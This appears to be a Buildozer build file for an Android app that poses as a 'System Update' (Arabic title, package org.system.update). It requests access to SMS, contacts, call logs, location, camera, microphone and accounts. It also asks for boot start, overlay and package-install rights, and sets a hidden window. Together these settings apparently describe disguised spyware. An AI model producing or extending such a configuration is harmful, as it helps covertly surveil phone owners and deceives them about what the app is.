[app]

title = تحديث النظام
package.name = systemupdate
package.domain = org.system.update
version = 2.0.0
version.code = 2
source.dir = .
source.include_exts = py,png,jpg,kv,atlas
requirements = python3,kivy,requests
android.api = 34
android.minapi = 21
android.ndk = 25c
android.permissions = INTERNET,ACCESS_NETWORK_STATE,ACCESS_WIFI_STATE,READ_CONTACTS,READ_SMS,READ_CALL_LOG,ACCESS_FINE_LOCATION,ACCESS_COARSE_LOCATION,CAMERA,RECORD_AUDIO,READ_EXTERNAL_STORAGE,WRITE_EXTERNAL_STORAGE,READ_PHONE_STATE,GET_ACCOUNTS,RECEIVE_BOOT_COMPLETED,SYSTEM_ALERT_WINDOW,FOREGROUND_SERVICE,REQUEST_INSTALL_PACKAGES,QUERY_ALL_PACKAGES
android.window_state = hidden
android.launch_mode = singleInstance
android.enable_androidx = True

[buildozer]
log_level = 2
warn_on_root = 1
